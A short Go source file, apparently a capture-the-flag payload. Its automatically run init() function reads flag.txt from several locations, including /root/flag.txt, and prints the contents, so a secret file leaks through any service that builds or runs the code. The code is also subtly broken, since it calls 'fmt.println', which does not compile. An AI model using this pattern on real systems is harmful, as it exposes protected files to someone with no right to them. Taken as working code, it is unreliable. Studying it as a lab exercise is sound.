package main

import (
    "fmt"
    "io/ioutil"
)

func init() {
    data, _ := ioutil.ReadFile("/flag.txt")
	data2,_ := ioutil.ReadFile("/root/flag.txt")
	data3,_ := ioutil.ReadFile("./flag.txt")
	data4,_ := ioutil.ReadFile("../flag.txt")
    fmt.Printf("Flag: %s", string(data)) // Properly formatted string
	fmt.println("")
	fmt.Printf("Flag: %s", string(data2)) // Properly formatted string
	fmt.println("")
	fmt.Printf("Flag: %s", string(data3)) // Properly formatted string
	fmt.println("")
	fmt.Printf("Flag: %s", string(data4)) // Properly formatted string
	fmt.println("")
}